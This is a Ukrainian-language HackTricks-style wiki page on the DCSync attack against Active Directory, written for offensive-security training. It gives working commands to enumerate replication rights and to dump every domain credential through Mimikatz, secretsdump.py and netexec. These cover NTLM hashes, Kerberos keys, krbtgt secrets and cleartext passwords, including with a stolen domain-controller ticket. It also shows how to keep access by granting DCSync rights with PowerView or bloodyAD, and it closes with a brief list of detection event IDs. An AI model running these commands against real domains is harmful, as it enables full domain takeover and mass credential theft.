# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Дозвіл **DCSync** передбачає наявність таких дозволів для самого домену: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** і **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Важливі примітки щодо DCSync:**

- **Атака DCSync імітує поведінку контролера домену та запитує в інших контролерів домену реплікацію інформації** за допомогою Directory Replication Service Remote Protocol (MS-DRSR). Оскільки MS-DRSR є дійсною та необхідною функцією Active Directory, її неможливо вимкнути.
- За замовчуванням лише групи **Domain Admins, Enterprise Admins, Administrators і Domain Controllers** мають необхідні привілеї.
- На практиці для **повного DCSync** потрібні дозволи **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** для контексту іменування домену. `DS-Replication-Get-Changes-In-Filtered-Set` часто делегують разом із ними, але окремо він актуальніший для синхронізації **конфіденційних атрибутів / атрибутів, відфільтрованих для RODC** (наприклад, секретів у стилі застарілої версії LAPS), ніж для повного дампу krbtgt.<sup>[[2]](#references)</sup>
- Якщо паролі облікових записів зберігаються із застосуванням оборотного шифрування, у Mimikatz є опція для виведення пароля у відкритому вигляді

### Перелік

Перевірте, хто має ці дозволи, за допомогою `powerview`:

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

Якщо потрібно зосередитися на **нестандартних суб’єктах** із правами DCSync, відфільтруйте вбудовані групи, яким дозволено реплікацію, і перевірте лише неочікуваних суб’єктів доступу:

```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
  Where-Object {
    $_.ObjectType -match 'replication-get' -or
    $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
  } |
  Where-Object { $_.IdentityReference -notmatch $default } |
  Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```

### Exploit локально

```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### Exploit віддалено

```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```

Практичні приклади в межах заданої області:<sup>[[1]](#references)</sup>

```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

### DCSync за допомогою перехопленого TGT комп’ютера контролера домену (ccache)

Під час перевірки служби на контролері домену розрізняйте локальну ідентичність служби та її мережеву ідентичність. [Microsoft документує](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions), що віртуальні облікові записи SQL Server (`NT SERVICE\...`) отримують доступ до мережевих ресурсів від імені облікового запису комп’ютера-хоста. На контролері домену це може зробити обліковий запис комп’ютера DC важливим для перевірки прав на реплікацію, але сам foothold у службі не підтверджує наявність TGT комп’ютера, який можна експортувати, або придатних для DCSync облікових даних. Перш ніж вважати це можливим шляхом, перевірте фактичну ідентичність служби, контекст вихідної автентифікації, доступний квиток або облікові дані, а також ефективні права на реплікацію.

У сценаріях unconstrained delegation в режимі експорту можна перехопити TGT комп’ютера контролера домену (наприклад, `DC1$@DOMAIN` для `krbtgt@DOMAIN`). Потім можна використати цей ccache для автентифікації від імені DC і виконання DCSync без пароля.<sup>[[5]](#references)</sup>

```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Operational notes:

- **Шлях Kerberos в Impacket спочатку звертається до SMB**, а вже потім виконує виклик DRSUAPI. Якщо в середовищі ввімкнено **перевірку цільового імені SPN**, повний дамп може завершитися помилкою: `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- У такому разі спочатку запросіть service ticket **`cifs/<dc>`** для цільового DC або скористайтеся **`-just-dc-user`**, щоб негайно отримати дані потрібного облікового запису.
- Якщо у вас є лише обмежені права на реплікацію, синхронізація в стилі LDAP/DirSync усе одно може розкрити **конфіденційні** або **відфільтровані для RODC** атрибути (наприклад, застарілий `ms-Mcs-AdmPwd`) без повної реплікації krbtgt.<sup>[[2]](#references)</sup>

`-just-dc` створює 3 файли:

- один із **NTLM-хешами**
- один із **ключами Kerberos**
- один із паролями у відкритому вигляді з NTDS для всіх облікових записів, для яких увімкнено [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Знайти користувачів із reversible encryption можна за допомогою

  ```bash
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
  ```

### Закріплення

Якщо ви є адміністратором домену, за допомогою PowerView можна надати ці дозволи будь-якому користувачу:<sup>[[3]](#references)</sup>

```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

Оператори Linux можуть зробити те саме за допомогою `bloodyAD`:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```

Потім можна **перевірити, чи користувачу правильно призначено** 3 привілеї, знайшовши їх у виводі команди (назви привілеїв мають відображатися в полі "ObjectType"):

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```

### Заходи пом’якшення

- Security Event ID 4662 (має бути ввімкнена політика аудиту для об’єкта) — виконано операцію над об’єктом<sup>[[4]](#references)</sup>
- Security Event ID 5136 (має бути ввімкнена політика аудиту для об’єкта) — змінено об’єкт служби каталогів
- Security Event ID 4670 (має бути ввімкнена політика аудиту для об’єкта) — змінено дозволи для об’єкта
- AD ACL Scanner — створюйте та порівнюйте звіти ACL. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Журнал змін Impacket](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: використання Replication Get-Changes і Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: отримання хешів паролів із контролера домену](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — облікові дані SYSVOL → цільовий Kerberoast → необмежене делегування → DCSync для DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
